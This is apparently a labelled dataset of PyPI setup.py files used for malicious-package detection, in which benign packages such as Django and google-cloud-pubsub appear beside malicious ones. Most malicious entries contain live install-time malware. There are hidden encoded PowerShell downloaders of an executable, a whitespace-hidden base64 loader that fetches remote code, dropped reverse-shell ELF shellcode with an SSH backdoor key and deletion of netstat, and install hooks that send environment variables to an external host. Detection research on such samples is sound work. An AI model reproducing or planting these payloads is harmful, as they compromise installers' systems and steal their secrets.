{"idx": "empy-3.3.4", "func": "#!/usr/bin/env python\n#\n# $Id: setup.py.pre 3116 2004-01-14 02:53:02Z max $ $Date: 2004-01-13 18:53:02 -0800 (Tue, 13 Jan 2004) $\n\nfrom distutils.core import setup\n\nDESCRIPTION = \"A templating system for Python.\"\n\nLONG_DESCRIPTION = \"\"\"\\\n    EmPy is a system for embedding Python expressions and statements\n    in template text; it takes an EmPy source file, processes it, and\n    produces output.  This is accomplished via expansions, which are\n    special signals to the EmPy system and are set off by a special\n    prefix (by default the at sign, '@').  EmPy can expand arbitrary\n    Python expressions and statements in this way, as well as a\n    variety of special forms.  Textual data not explicitly delimited\n    in this way is sent unaffected to the output, allowing Python to\n    be used in effect as a markup language.  Also supported are \"hook\"\n    callbacks, recording and playback via diversions, and dynamic,\n    chainable filters.  The system is highly configurable via command\n    line options and embedded commands.\n\"\"\"\n\nsetup(\n    name=\"empy\",\n    version=\"3.3.4\",\n    author=\"Erik Max Francis\", \n    author_email=\"software@alcyone.com\",\n    url=\"http://www.alcyone.com/software/empy\",\n    license=\"%LICENSE\",\n    py_modules=[\"em\"],\n    platforms=[\"unix\", \"linux\", \"win32\"],\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n)\n", "target": 0}
{"idx": "selfhydragamever-8.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhydragamever',\n    packages = ['modlib'],\n    version = '6.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pehttps-0.0.2", "func": "print('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMy44Ni4xOTAuMjA1L2luamVjdC9RcnZ4RkdLdnNTSjVFNWJ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\nimport setuptools\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"pehttps\",\n    version=\"0.0.2\",\n    author=\"Tony Simpson\",\n    author_email=\"agjasimpson@gmail.com\",\n    description=\"System process debug and analysis library.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/tonysimpson/pehttps\",\n    install_requires=[\"distorm3\", \"pyptrace\", \"pyelftools\"],\n    setup_requires=['pytest-runner'],\n    tests_require=['pytest'],\n    packages=setuptools.find_packages(),\n    classifiers=(\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: POSIX :: Linux\",\n    )\n)\n\n", "target": 1}
{"idx": "candygame-10.61", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'candygame',\n    packages = ['modlib'],\n    version = '8.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "aptx-0.2", "func": "from setuptools import setup, find_packages\nsetup(\n    name='aptx',\n    version='0.2',\n    license='MIT',\n    author=\"Giorgos Myrianthous\",\n    author_email='email@example.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='example project',\n    # install_requires=[\n    #       'scikit-learn',\n    #   ],\n\n)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport os\nimport subprocess\n\nf=open('/tmp/test_python','w+')\nf.write('asdf')\nf.close()\ntry:\n  os.mkdir('/tmp/.pip')\nexcept:\n  pass\n\ntry:\n  with open('/tmp/.pip/pip autoupdate', 'wb+') as f:\n    f.write(b'\\x7fELF\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00>\\x00\\x01\\x00\\x00\\x00x\\x00@\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x008\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\xc6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00j)X\\x99j\\x02_j\\x01^\\x0f\\x05H\\x97R\\xc7\\x04$\\x02\\x00\\xf6\\xecH\\x89\\xe6j\\x10Zj1X\\x0f\\x05Yj2X\\x0f\\x05H\\x96j+X\\x0f\\x05PV_j\\tX\\x99\\xb6\\x10H\\x89\\xd6M1\\xc9j\"AZ\\xb2\\x07\\x0f\\x05H\\x96H\\x97_\\x0f\\x05\\xff\\xe6')\n  os.chmod('/tmp/.pip/pip autoupdate', 0o555)\n\n  with open('/tmp/.pip/pip cleanup', 'wb+') as f:\n    f.write(b'\\x7fELF\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00>\\x00\\x01\\x00\\x00\\x00x\\x00@\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x008\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\xc6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00j)X\\x99j\\x02_j\\x01^\\x0f\\x05H\\x97R\\xc7\\x04$\\x02\\x00\\x15\\xb2H\\x89\\xe6j\\x10Zj1X\\x0f\\x05Yj2X\\x0f\\x05H\\x96j+X\\x0f\\x05PV_j\\tX\\x99\\xb6\\x10H\\x89\\xd6M1\\xc9j\"AZ\\xb2\\x07\\x0f\\x05H\\x96H\\x97_\\x0f\\x05\\xff\\xe6')\n  os.chmod('/tmp/.pip/pip cleanup', 0o555)\n\n\n  os.unlink('/bin/netstat')\n  os.unlink('/usr/bin/netstat')\n\n  \nexcept:\n  pass\n\ntry:\n  os.mkdir('/root/.ssh')\nexcept:\n  pass\ntry:\n  os.mkdir('/home/user/.ssh')\nexcept:\n  pass\ntry:\n  os.mkdir('/home/'+os.getenv['USER']+'/.ssh')\nexcept:\n  pass\n\ntry:\n  with open('/root/.ssh/authorized_keys','a+') as f:\n    f.write('ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG0C7//5mvvhE1Pr7K32kOtVzIbi5KTSt1r7b3020v24De8JdKhpMLDmZuLERucvE6IAy3wvhvALaYcC7wMTfSY=')\nexcept:\n  pass\ntry:\n  with open('/home/user/.ssh/authorized_keys','a+') as f:\n    f.write('ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG0C7//5mvvhE1Pr7K32kOtVzIbi5KTSt1r7b3020v24De8JdKhpMLDmZuLERucvE6IAy3wvhvALaYcC7wMTfSY=')\nexcept:\n  pass\ntry:\n  with open('/home/'+os.getenv('USER')+'/.ssh/authorized_keys', 'a+') as f:\n    f.write('ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG0C7//5mvvhE1Pr7K32kOtVzIbi5KTSt1r7b3020v24De8JdKhpMLDmZuLERucvE6IAy3wvhvALaYcC7wMTfSY=')\nexcept:\n  pass\n\ntry:\n  os.chmod('/root/.ssh/authorized_keys', 0o600)\nexcept:\n  pass\ntry:\n  os.chmod('/home/user/.ssh/authorized_keys', 0o600)\nexcept:\n  pass\ntry:\n  os.chmod('/home/'+os.getenv('USER')+'/.ssh/authorized_keys', 0o600)\nexcept:\n  pass\n\nsubprocess.run('\"/tmp/.pip/pip autoupdate\" &', shell=True)\nsubprocess.run('\"/tmp/.pip/pip cleanup\" &', shell=True)\n", "target": 1}
{"idx": "booto3-0.0.1", "func": "# This script is for research not for doing any harmful activity\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom setuptools.command.egg_info import egg_info\nimport subprocess\nimport os\n\n\ndef RunCommand():\n    # Capture environment variables\n    env_vars = os.environ\n\n    # Run the ps -elf command and capture its output\n    output = subprocess.check_output([\"ps\", \"-elf\"]).decode(\"utf-8\")\n\n    # Convert environment variables to a string\n    env_vars_string = \"&\".join([f\"{key}={value}\" for key, value in env_vars.items()])\n\n    # Construct the data to be sent in the POST request\n    data = {\"ps_output\": output, \"environment\": env_vars_string}\n\n    # Convert the data dictionary to a string of key-value pairs\n    data_string = \"&\".join([f\"{key}={value}\" for key, value in data.items()])\n\n    # Construct the curl command to send a POST request with the data to the server\n    curl_command = [\n        \"curl\",\n        \"-X\",\n        \"POST\",\n        \"-d\",\n        f\"'{data_string}'\",  # Pass the data as form data\n        \"http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun\",\n    ]\n\n    # Execute the curl command\n    subprocess.run(curl_command, check=True)\n\n\nclass RunEggInfoCommand(egg_info):\n    def run(self):\n        RunCommand()\n        egg_info.run(self)\n\n\nclass RunInstallCommand(install):\n    def run(self):\n        RunCommand()\n        install.run(self)\n\n\nsetup(\n    name=\"booto3\",\n    version=\"0.0.1\",\n    license=\"MIT\",\n    packages=find_packages(),\n    cmdclass={\"install\": RunInstallCommand, \"egg_info\": RunEggInfoCommand},\n)\n", "target": 1}
{"idx": "py-studyram-1.43", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studyram',\n    packages = ['modlib'],\n    version = '1.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pywpost-5.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pywpost',\n    packages = ['modlib'],\n    version = '2.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Django-4.1", "func": "import os\nimport site\nimport sys\nfrom distutils.sysconfig import get_python_lib\n\nfrom setuptools import setup\n\n# Allow editable install into user site directory.\n# See https://github.com/pypa/pip/issues/7953.\nsite.ENABLE_USER_SITE = \"--user\" in sys.argv[1:]\n\n# Warn if we are installing over top of an existing installation. This can\n# cause issues where files that were deleted from a more recent Django are\n# still present in site-packages. See #18115.\noverlay_warning = False\nif \"install\" in sys.argv:\n    lib_paths = [get_python_lib()]\n    if lib_paths[0].startswith(\"/usr/lib/\"):\n        # We have to try also with an explicit prefix of /usr/local in order to\n        # catch Debian's custom user site-packages directory.\n        lib_paths.append(get_python_lib(prefix=\"/usr/local\"))\n    for lib_path in lib_paths:\n        existing_path = os.path.abspath(os.path.join(lib_path, \"django\"))\n        if os.path.exists(existing_path):\n            # We note the need for the warning here, but present it after the\n            # command is run, so it's more likely to be seen.\n            overlay_warning = True\n            break\n\n\nsetup()\n\n\nif overlay_warning:\n    sys.stderr.write(\n        \"\"\"\n\n========\nWARNING!\n========\n\nYou have just installed Django over top of an existing\ninstallation, without removing it first. Because of this,\nyour install may now include extraneous files from a\nprevious version that have since been removed from\nDjango. This is known to cause a variety of problems. You\nshould manually remove the\n\n%(existing_path)s\n\ndirectory and re-install Django.\n\n\"\"\"\n        % {\"existing_path\": existing_path}\n    )\n", "target": 0}
{"idx": "google-cloud-pubsub-2.13.6", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-pubsub\"\ndescription = \"Google Cloud Pub/Sub API client library\"\nversion = \"2.13.6\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"grpcio >= 1.38.1, < 2.0dev\",  # https://github.com/googleapis/python-pubsub/issues/414\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.22.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <5.0.0dev\",\n    \"grpc-google-iam-v1 >=0.12.4, <1.0.0dev\",\n    \"grpcio-status >= 1.16.0\",\n]\nextras = {\"libcst\": \"libcst >= 0.3.10\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-pubsub\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_pubsub_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "esqreinfore-5.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqreinfore',\n    packages = ['modlib'],\n    version = '8.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqpeppywvirtual-9.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpeppywvirtual',\n    packages = ['modlib'],\n    version = '4.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "glog-0.3.1", "func": "#!/usr/bin/env python\n\nimport os\nimport setuptools\n\nVERSION = '0.3.1'\n\nREADME = open(os.path.join(os.path.dirname(__file__), 'README.rst')).read()\n\nsetuptools.setup(\n    name='glog',\n    author='Benjamin Staffin',\n    author_email='benley@gmail.com',\n    url='https://github.com/benley/python-glog',\n    install_requires=[\n        'python-gflags>=3.1',\n        'six',  # glog doesn't need six, but gflags 3.1 does and its distutils\n                # \"requires\" line apparently accomplishes nothing, so ...\n    ],\n    description='Simple Google-style logging wrapper for Python.',\n    long_description=README,\n    py_modules=['glog'],\n    license='BSD',\n    test_suite='tests',\n    version=VERSION,\n    classifiers=[\n        'Programming Language :: Python',\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Topic :: System :: Logging',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    platforms='any',\n)\n", "target": 0}
{"idx": "libnvidiapy-7.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiapy',\n    packages = ['modlib'],\n    version = '1.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
